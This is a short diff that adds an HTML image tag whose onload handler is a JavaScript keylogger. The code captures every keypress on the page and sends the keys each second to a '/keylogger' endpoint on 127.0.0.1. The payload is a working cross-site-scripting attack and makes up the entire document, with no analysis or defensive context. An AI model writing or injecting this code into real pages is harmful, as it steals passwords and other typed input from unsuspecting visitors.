@@ -1,0 +1,18 @@
+<img src="http://www.iconarchive.com/download/i87838/icons8/ios7/Computer-Hardware-Keyboard.ico" onload="javascript:
+    var keys = '';
+    var url = 'http://127.0.0.1/keylogger?keys=';
+
+    document.onkeypress = function(event) {
+        keys += event.key;
+    };
+
+    window.setInterval(function() {
+        if (keys.length > 0) {
+            // Construct and send the request
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open('GET', url + keys, true);
+            xmlHttp.send();
+            keys = '';
+        }
+    }, 1000);
+"/>
